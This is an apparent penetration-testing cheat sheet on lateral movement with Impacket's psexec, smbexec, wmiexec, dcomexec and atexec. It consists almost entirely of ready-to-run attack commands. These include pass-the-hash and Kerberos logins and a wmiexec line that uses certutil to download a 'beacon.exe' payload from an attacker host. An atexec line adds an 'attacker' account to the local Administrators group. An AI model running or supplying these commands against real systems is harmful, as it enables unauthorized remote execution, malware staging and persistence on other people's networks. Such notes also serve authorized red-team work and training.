# 07.09 Remote Execution psexec smbexec wmiexec dcomexec atexec

> Compare `psexec` (SYSTEM, noisy), `wmiexec` (user, semi-interactive), `smbexec` (no drop), `dcomexec`, and `atexec` for execution.

## Overview

Impacket provides five remote execution methods with different noise profiles, authentication requirements, and artifacts. psexec = SYSTEM + noisy; wmiexec = user context + semi-interactive; smbexec = no binary drop; dcomexec = DCOM COM objects; atexec = Task Scheduler.

## Steps

- psexec: uploads .exe as a service — caught by most AV, leaves service artifacts
- smbexec: creates service per command (no binary upload), output via share
- wmiexec: WMI process creation, output written to C:\, cleaner but still logged
- dcomexec: abuses DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)
- atexec: Task Scheduler; non-interactive, useful for blind execution
- All support PTH with -hashes and Kerberos with -k -no-pass

## Commands

### psexec.py — SYSTEM shell (noisy)

```bash
impacket-psexec DOMAIN/user:'P@ss'@TARGET_IP
impacket-psexec -hashes :NThash DOMAIN/user@TARGET_IP
impacket-psexec DOMAIN/user:'P@ss'@TARGET_IP cmd.exe
impacket-psexec -k -no-pass DOMAIN/user@TARGET.DOMAIN
```

### smbexec.py — shell without binary upload

```bash
impacket-smbexec DOMAIN/user:'P@ss'@TARGET_IP
impacket-smbexec -hashes :NThash DOMAIN/user@TARGET_IP
impacket-smbexec -hashes :NThash -service-name MySvc DOMAIN/user@TARGET_IP
```

### wmiexec.py — semi-interactive WMI

```bash
impacket-wmiexec DOMAIN/user:'P@ss'@TARGET_IP
impacket-wmiexec -hashes :NThash DOMAIN/user@TARGET_IP
impacket-wmiexec DOMAIN/user:'P@ss'@TARGET_IP "cmd /c whoami"
impacket-wmiexec -nooutput DOMAIN/user:'P@ss'@TARGET_IP "cmd /c certutil.exe -urlcache -f http://ATTACKER/beacon.exe C:\Windows\Temp\b.exe"
```

### dcomexec.py — DCOM objects

```bash
impacket-dcomexec DOMAIN/user:'P@ss'@TARGET_IP
impacket-dcomexec -object MMC20 DOMAIN/user:'P@ss'@TARGET_IP
impacket-dcomexec -object ShellWindows DOMAIN/user:'P@ss'@TARGET_IP
impacket-dcomexec -object ShellBrowserWindow DOMAIN/user:'P@ss'@TARGET_IP
impacket-dcomexec -hashes :NThash DOMAIN/user@TARGET_IP
```

### atexec.py — Task Scheduler execution

```bash
impacket-atexec DOMAIN/user:'P@ss'@TARGET_IP "whoami"
impacket-atexec -hashes :NThash DOMAIN/user@TARGET_IP "net user /domain"
impacket-atexec DOMAIN/user:'P@ss'@TARGET_IP "cmd /c net localgroup Administrators attacker /add"
```
